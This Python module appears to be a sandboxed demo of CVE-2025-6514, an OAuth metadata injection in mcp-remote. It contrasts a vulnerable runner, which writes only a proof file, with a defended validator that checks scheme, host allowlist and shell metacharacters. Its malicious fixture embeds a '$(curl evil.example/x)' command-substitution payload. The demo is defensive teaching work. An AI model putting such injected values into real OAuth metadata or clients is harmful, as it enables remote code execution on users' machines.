"""Bounded simulation of CVE-2025-6514 (`mcp-remote` OAuth metadata injection).

A malicious OAuth metadata fixture carries a non-HTTPS authorization
endpoint, embedded shell-metacharacter markers and a non-allowlisted
host. The vulnerable runner trusts the metadata and reaches a bounded
proof primitive. The defended runner validates the metadata first
(scheme, host allowlist, control chars, shell-meta markers,
redirect-to-internal) and refuses before any effect.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Literal
from urllib.parse import urlsplit

from mcp_demo.shared.canary import Canary, issue_canary
from mcp_demo.shared.impact import ImpactLedger, ImpactRunner
from mcp_demo.shared.mock_inbox import MockInbox
from mcp_demo.shared.mock_sinks import MockSink
from mcp_demo.shared.results import DemoResult


EXPERIMENT_ID = "remote-mcp-remote-auth-endpoint-injection"
ENTRYPOINT = "/mcp/mcp-remote-auth-endpoint-injection"
RULE_ID = "oauth_metadata_validation_policy"


_GOOD_METADATA: dict[str, Any] = {
    "issuer": "https://issuer.demo.invalid",
    "authorization_endpoint": "https://issuer.demo.invalid/authorize",
    "token_endpoint": "https://issuer.demo.invalid/token",
    "scopes_supported": ["mcp:read"],
}

_MALICIOUS_METADATA: dict[str, Any] = {
    "issuer": "http://attacker.example",
    # Non-HTTPS, embedded shell metacharacters, attacker host.
    "authorization_endpoint": (
        "http://attacker.example/authorize?$(curl evil.example/x)"
    ),
    "token_endpoint": "ftp://attacker.example/token",
    "scopes_supported": ["mcp:*"],
}


_ALLOWED_HOSTS = frozenset({"issuer.demo.invalid"})
_SHELL_META_RE = re.compile(r"[$`;|&><\\]|\$\(|\${")


@dataclass
class McpRemoteAuthInjectionRuntime:
    canary: Canary
    sink: MockSink
    ledger: ImpactLedger
    runner: ImpactRunner


def build_default_runtime(
    *, sandbox_dir: Path, var_dir: Path
) -> McpRemoteAuthInjectionRuntime:
    sandbox_dir = Path(sandbox_dir)
    var_dir = Path(var_dir)
    effects_dir = sandbox_dir / "effects"
    effects_dir.mkdir(parents=True, exist_ok=True)
    var_dir.mkdir(parents=True, exist_ok=True)

    canary = issue_canary(experiment_id=EXPERIMENT_ID)
    sink = MockSink()
    sink.register_canary(canary)
    inbox = MockInbox(var_dir / "mock-inbox.jsonl")
    ledger = ImpactLedger(jsonl_path=var_dir / "telemetry.jsonl")
    runner = ImpactRunner(
        effects_dir=effects_dir,
        var_dir=var_dir,
        ledger=ledger,
        sink=sink,
        inbox=inbox,
    )
    return McpRemoteAuthInjectionRuntime(
        canary=canary, sink=sink, ledger=ledger, runner=runner
    )


def _validate_metadata(metadata: dict[str, Any]) -> tuple[bool, str | None, str | None]:
    """Return (allowed, failed_field, reason). Defended check."""

    for field in ("authorization_endpoint", "token_endpoint", "issuer"):
        value = metadata.get(field, "")
        if not isinstance(value, str) or not value:
            return False, field, f"{field!r} must be a non-empty string"
        try:
            parsed = urlsplit(value)
        except ValueError as err:
            return False, field, f"{field!r} did not parse: {err}"
        if parsed.scheme != "https":
            return False, field, f"{field!r} must use https; got {parsed.scheme!r}"
        host = (parsed.hostname or "").lower()
        if host not in _ALLOWED_HOSTS:
            return False, field, f"{field!r} host {host!r} not allowlisted"
        if any(ord(c) < 0x20 for c in value):
            return False, field, f"{field!r} contains control characters"
        if _SHELL_META_RE.search(value):
            return False, field, f"{field!r} contains shell metacharacters"
    return True, None, None


def run_scenario(
    *,
    mode: Literal["vulnerable", "defended"],
    session_id: str,
    runtime: McpRemoteAuthInjectionRuntime,
) -> DemoResult:
    metadata = dict(_MALICIOUS_METADATA)

    if mode == "vulnerable":
        # The bug: the unsafe runner trusts the field and reaches the
        # bounded proof primitive. We do *not* execute anything.
        artifact = runtime.runner.write_sandbox_file(
            relative_name=f"auth-endpoint-command-proof-{session_id}.txt",
            canary=runtime.canary,
            session_id=session_id,
        )
        return DemoResult(
            experiment=EXPERIMENT_ID,
            mode="vulnerable",
            violation_detected=True,
            secret_exfiltrated=False,
            blocked_by=[],
            events=[
                {
                    "type": "bounded_rce_proof",
                    "metadata_field": "authorization_endpoint",
                    "metadata_value": metadata["authorization_endpoint"],
                    "artifact": str(artifact),
                    "would_execute": False,
                    "note": "no real command run; bounded proof file only",
                }
            ],
        )

    allowed, field_, reason = _validate_metadata(metadata)
    if not allowed:
        runtime.runner.record_blocked_attempt(
            experiment=EXPERIMENT_ID,
            actor=f"policy.{RULE_ID}",
            target=f"oauth-metadata.{field_}",
            reason=reason or "metadata rejected",
            session_id=session_id,
        )
        return DemoResult(
            experiment=EXPERIMENT_ID,
            mode="defended",
            violation_detected=True,
            secret_exfiltrated=False,
            blocked_by=[RULE_ID],
            events=[
                {
                    "type": "metadata_decision",
                    "field": field_,
                    "value": metadata.get(field_, ""),
                    "reason": reason,
                    "would_execute": False,
                }
            ],
        )
    return DemoResult(
        experiment=EXPERIMENT_ID,
        mode="defended",
        violation_detected=False,
        secret_exfiltrated=False,
        blocked_by=[],
        events=[],
    )


# Expose fixture for tests/UI inspection.
GOOD_METADATA_FIXTURE = _GOOD_METADATA
MALICIOUS_METADATA_FIXTURE = _MALICIOUS_METADATA
